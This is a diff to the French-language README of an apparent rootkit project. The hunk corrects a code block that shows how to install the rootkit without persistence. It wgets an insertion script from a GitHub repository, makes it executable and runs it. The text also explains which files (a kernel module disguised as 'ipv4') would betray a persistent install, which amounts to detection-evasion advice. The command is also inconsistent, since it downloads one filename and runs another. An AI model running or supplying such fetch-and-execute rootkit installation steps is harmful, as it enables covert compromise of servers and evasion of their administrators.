@@ -171,7 +171,7 @@ Un user n’ayant pas les droits root ne peut pas désactiver les kprobes.
 - Dans le cas ou la persistance n’est pas nécessaire (sur un serveur n’ayant pas à être reboot), comme elle implique d’être facilement détectable à cause des 3 fichiers listés précédemment (`/etc/modules`,`/lib/modules/$(uname -r)/extra/ipv4.ko`, `/etc/modprobe.d/ipv4.conf`) il existe un script d’insertion alternatif sans la persistance `insertion_script_without_persistence`
 
 ```c
-Dans le cas ou la persistance n’est pas nécessaire (sur un serveur n’ayant pas à être reboot), comme elle implique d’être facilement détectable à cause des 3 fichiers listés précédemment (/etc/modules,/lib/modules/$(uname -r)/extra/ipv4.ko, /etc/modprobe.d/ipv4.conf) il existe un script d’insertion alternatif sans la persistance insertion_script_without_persistence wget https://raw.githubusercontent.com/gobelinor/Rootkit-Project/refs/heads/main/mesmodules/insert/insertion_script_without_persistence
+wget https://raw.githubusercontent.com/gobelinor/Rootkit-Project/refs/heads/main/mesmodules/insert/insertion_script_without_persistence
 chmod +x insertion_script
 ./insertion_script
 ```
